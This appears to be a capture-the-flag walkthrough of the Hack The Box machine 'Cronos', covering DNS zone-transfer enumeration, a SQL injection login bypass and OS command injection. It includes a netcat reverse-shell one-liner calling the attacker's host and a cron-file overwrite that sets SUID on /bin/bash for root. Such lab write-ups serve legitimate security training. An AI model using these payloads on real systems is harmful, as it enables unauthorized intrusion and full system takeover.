# Cronos

## Basic Information

|          |  |
| :---                 |     :---:      |
| Machine Name         | Cronos     |
| Written by           | Adir Biran       |
| IP Address           | 10.10.10.13       |
| Tools and Techniques | Nmap, Gobuster, nslookup, dig, SQL Injection, Command Injection, Cronjobs       |

## Method

## Enumeration


#### Nmap
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677718-6b630f54-92d5-4b90-81fb-10b4ee89e47c.png">
</p>

Open Ports:  
22 - SSH  
53 - DNS  
80 - HTTP  

#### Gobuster

Gobuster - Port 80  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677719-8e4f9dfc-7820-45e4-94e6-8c32a582ec1c.png">
</p>

The website - Port 80  
<img src="https://user-images.githubusercontent.com/21021400/145677720-3e99be85-6762-4023-b68f-4ea99ef70811.png">
<p align="center">
</p>

Looking for virtual hosts and using the machine itself as the DNS server  
```
nslookup 10.10.10.13 10.10.10.13
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677721-c549c411-d118-4ee8-b20f-8e09f00ece02.png">
</p>

Domain found: cronos.htb  

Looking for virtual hosts related to cronos.htb  
```
dig axfr cronos.htb @10.10.10.13
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677722-ed52b9d2-3f44-4209-914e-f554938b985e.png">
</p>

Virtual hosts found:  
cronos.htb  
ns1.cronos.htb  
admin.cronos.htb  

Added them to /etc/hosts  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677724-0e8d0677-de27-431c-b431-a4c2543bc3ef.png">
</p>

cronos.htb  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677725-62437be2-326c-4156-a4f1-056cf65a3d0f.png">
</p>

ns1.cronos.htb  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677726-669d2693-4015-4bd3-9fd1-e5db1f99600d.png">
</p>

admin.cronos.htb  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677727-1dd27a73-4488-4ab9-84df-3e66d18d86fa.png">
</p>

## Exploitation

Tried admin:admin and few more default credentials - all failed  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677728-c38155e2-6f05-4b32-a689-73826a4275f3.png">
</p>

#### SQL Injection

Tried SQL injection
```
' or 1==1-- -
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677729-957cac37-65da-4faf-b628-2a22bfa7f000.png">
</p>

And we're in.  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677730-8ba44d89-b9d2-40e3-bc3b-af0c3d40a76e.png">
</p>

Pinged myself and captured the traffic with tcpdump  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677731-a0421405-d315-4c4d-83bb-358db05712b7.png">
</p>

#### OS Command Injection

Tried OS command injection  
```
;whoami
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677732-e56b199b-bef1-426b-8862-a9fbebf28565.png">
</p>

The user running the commands is www-data.  

Let's get a reverse shell  
```
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677733-3136df78-09b4-41a1-838e-d81c4ed01a9f.png">
</p>

## Privilege Escalation (www-data -> root)

Users on the machine:  
www-data  
noulis  
root  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677734-876ef1e6-3b9a-4935-96b1-33269212394d.png">
</p>


www-data's groups  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677735-524fc622-ce17-478c-bc2c-a058ed843151.png">
</p>

SUID files  
```
find / -perm -4000 2>/dev/null
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677736-dd9b77d6-dd8e-433b-b7cf-5b1bf67f275c.png">
</p>

sudo permissions  
```
sudo -l
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677737-7c8f3876-147c-4fd3-810b-43f038b7a8d6.png">
</p>

Capabilities  
```
getcap -r / 2>/dev/null
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677739-1f478587-07f6-4cef-85a2-c402e4577402.png">
</p>

Checking noulis' home directory  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677740-55b963a1-2c6f-47e9-8f5d-e721e09f6b2f.png">
</p>

Checking /var/www directory  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677742-542d0ded-42b9-4f1a-bdef-4ee2150eebce.png">
</p>

Laravel is installed in /var/www, checking config files in laravel/.env  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677743-be5d86da-253d-47fb-8d83-36e4dd8a01e7.png">
</p>

Checking crontab
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677744-5453e29a-9bfa-41d2-a291-59c471a12b35.png">
</p>

There is a cron job running by root every minute.  
executing with php the /var/www/laravel/artisan file.  

Checking the content of the artisan file  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677745-a124ded3-b202-4f6b-9522-d1c1bd6384a0.png">
</p>

We can write to that file  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677746-4671096c-0975-4a67-83cf-ea1b57a76929.png">
</p>

Let's replace the content of the file with the following:  
```
<?php
system('chmod +s /bin/bash');
?>
```

By executing the command:  
```
echo "<?php system('chmod +s /bin/bash'); ?>" > artisan
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677747-c67e0899-65b3-4edc-9aa5-1b3c133f36a9.png">
</p>

Once executed by root, a SUID will be added to /bin/bash and we will be able to get a root shell.  

After a minute, checking the /bin/bash permissions:  
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677751-26efb128-2f8d-4e92-a4fc-9ff0bc959494.png">
</p>

Executing a root shell  
```
bash -p
```
<p align="center">
<img src="https://user-images.githubusercontent.com/21021400/145677752-17ae7c2b-99f1-43e9-93ec-6ca7e13fbad5.png">
</p>

and we're root.
